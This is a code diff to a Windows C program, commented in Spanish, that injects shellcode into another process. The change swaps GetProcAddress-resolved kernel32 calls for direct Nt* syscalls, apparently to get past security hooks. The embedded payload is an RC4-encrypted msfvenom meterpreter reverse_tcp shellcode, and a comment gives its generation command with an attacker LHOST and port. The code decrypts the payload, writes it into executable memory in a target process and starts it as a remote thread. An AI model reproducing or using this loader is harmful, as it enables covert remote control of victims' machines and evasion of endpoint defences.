@@ -1,13 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
+#include "syscall.h"
+
 
 #define ARRAY_LENGTH	256
-
-typedef HANDLE	(WINAPI *EOpenProcess)			(DWORD, BOOL, DWORD);
-typedef LPVOID  (WINAPI *EVirtualAllocEx)       (HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-typedef BOOL    (WINAPI *EWriteProcessMemory)   (HANDLE, LPVOID, LPCVOID,  SIZE_T, SIZE_T*);
-typedef HANDLE  (WINAPI *ECreateRemoteThread)   (HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
-
 
 unsigned char s[ARRAY_LENGTH];
 int rc4_i;
@@ -85,9 +81,10 @@ int main(int argc, char *argv[]) {
         return 0;
     }
 
+
     //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.147.139 LPORT=443 --encrypt rc4 --encrypt-key inc0d3 -f c
     unsigned char payload[] = 
-                           "\x88\xa1\x26\x40\xb5\x38\xd1\xcc\xf0\x6f\x95\x33\x33\x24\x60"
+                            "\x88\xa1\x26\x40\xb5\x38\xd1\xcc\xf0\x6f\x95\x33\x33\x24\x60"
                             "\x97\xfb\x45\x88\xe2\x99\xa1\xce\xdb\xd0\x39\x07\x97\x0d\xe9"
                             "\x6a\x1a\x81\x59\x97\xe4\xee\x10\x4e\x36\x26\x3d\x3e\x94\x29"
                             "\x04\x22\x56\xbb\xba\x7f\xad\x63\xdc\x13\xfc\x34\x48\x6d\x98"
@@ -123,118 +120,70 @@ int main(int argc, char *argv[]) {
                             "\x8c\x08\x3f\x07\x0d\x44\xfd\x11\x8e\x65\xb4\x53\x79\x52\x49";
 
 
-    HMODULE kernel = GetModuleHandle("kernel32.dll");
 
-    if (kernel == NULL) {
-        printf("\nError al obtener el modulo:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] Modulo Kernel32 controlado correctamente en 0x%p", kernel);
-
-
-
-    FARPROC loadLib = GetProcAddress(kernel, "LoadLibraryA");
-
+    NTSTATUS status;
+    unsigned char keystream_byte;
+    OBJECT_ATTRIBUTES objAttr;
+    CLIENT_ID cID;
+    HANDLE p = NULL;
+    LPVOID vAlloc;
+    SIZE_T allocation_size = sizeof(payload);
+    HANDLE remoteThread;
+    ULONG pid = (ULONG)atoi(argv[1]);
     
-    if (loadLib == NULL) {
-        printf("\nError al obtener la direccion de loadlibrary:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] LoadLibrary controlado correctamente en 0x%p", loadLib);
-
-
-    EOpenProcess openProc = (EOpenProcess)GetProcAddress(kernel, "OpenProcess");
-
-    if (openProc == NULL) {
-        printf("\nError al obtener la direccion de OpenProcess:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] OpenProcess controlado correctamente en 0x%p", openProc);
-
-    HANDLE p = openProc(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, atoi(argv[1]));
-    if (p == NULL) {
-        printf("\nError al controlar el proceso:");
+    InitRC4();
+	
+	DoKSA("inc0d3", 6);
+    
+    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+    cID.UniqueProcess = UlongToHandle(pid);
+    cID.UniqueThread = NULL;
+    
+    status = NtOpenProcess(&p, PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, &objAttr, &cID);
+     
+    if (!NT_SUCCESS(status)) {
+        printf("\n[!] Error al controlar el proceso: ");
         printLastError();
         return 1;
     }
     printf("\n[+] Proceso controlado correctamente en 0x%p", p);
 
-
-    EVirtualAllocEx eVirtualAlloc = (EVirtualAllocEx)GetProcAddress(kernel, "VirtualAllocEx");
-
-    if (eVirtualAlloc == NULL) {
-        printf("\nError al obtener la direccion de VirtualAllocEx:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] VirtualAllocEx controlado correctamente en 0x%p", eVirtualAlloc);
-
-
-    LPVOID vAlloc = eVirtualAlloc(p, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
-    if (vAlloc == NULL) {
+    status = NtAllocateVirtualMemory(p, &vAlloc, 0, &allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+     
+    if (!NT_SUCCESS(status)) {
         printf("\nError al solicitar memoria en el proceso: ");
         printLastError();
         return 1;
     }
-    printf("\n[+] Memoria creada en el espacio del proceso correctamente en 0x%p", vAlloc);
+    printf("\n[+] Memoria creada en el espacio del proceso correctamente en 0x%p de tamano %i", vAlloc, allocation_size);
 
-    unsigned char keystream_byte;
-
-    InitRC4();
-	
-	DoKSA("inc0d3", 6);
-
-    printf("\n[+] Tamano del payload %i ", sizeof(payload));
+    
+    printf("\n[+] Tamano del payload %i", sizeof(payload));
 
     for(size_t i = 0, len = sizeof(payload) - 1; i < len; i++) {
         keystream_byte = GetPRGAOutput();
         payload[i] = payload[i] ^ keystream_byte;
-        //printf("\\x%02hhX", payload[i]);
+       // printf("\\x%02hhX", payload[i]);
     }
     
-    
-    EWriteProcessMemory eWrite = (EWriteProcessMemory)GetProcAddress(kernel, "WriteProcessMemory");
+    status = NtWriteVirtualMemory(p, vAlloc, (PVOID)payload, allocation_size, 0);
 
-    if (eWrite == NULL) {
-        printf("\nError al obtener la direccion de WriteProcessMemory:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] WriteProcessMemory controlado correctamente en 0x%p", eWrite);
-
-
-      
-    BOOL result = eWrite(p, vAlloc, payload, sizeof(payload), NULL);
-
-    if (result == FALSE) {
-        printf("\nError al escribir la shellcode en la memoria del proceso: ");
+    if (!NT_SUCCESS(status)) {
+        printf("\n[!] Error al escribir la shellcode en la memoria del proceso COD: %d : ",GetLastError());
         printLastError();
         return 1;
     }
     printf("\n[+] Shellcode copiada en la memoria del proceso correctamente");
 
-     
-    ECreateRemoteThread eCreate = (ECreateRemoteThread)GetProcAddress(kernel, "CreateRemoteThread");
 
-    if (eCreate == NULL) {
-        printf("\nError al obtener la direccion de CreateRemoteThread:");
-        printLastError();
-        return 1;
-    }
-    printf("\n[+] CreateRemoteThread controlado correctamente en 0x%p", eCreate);
-
-    HANDLE remoteThread = eCreate(p, NULL, 0, (LPTHREAD_START_ROUTINE)vAlloc, NULL, 0, NULL);
-
-    if (remoteThread == NULL) {
-        printf("\nError al ejecutar la shellcode: ");
+    status = NtCreateThreadEx(&remoteThread, GENERIC_EXECUTE, NULL, p, (LPTHREAD_START_ROUTINE)vAlloc, NULL, FALSE, 0, 0, 0, 0);
+    
+    if (!NT_SUCCESS(status)) {
+        printf("\n[!] Error al ejecutar la shellcode: ");
         printLastError();
         return 1;
     }
     printf("\n[+] Shellcode ejecutada correctamente en 0x%p", remoteThread);
-
 
     WaitForSingleObject(remoteThread, INFINITE);
 
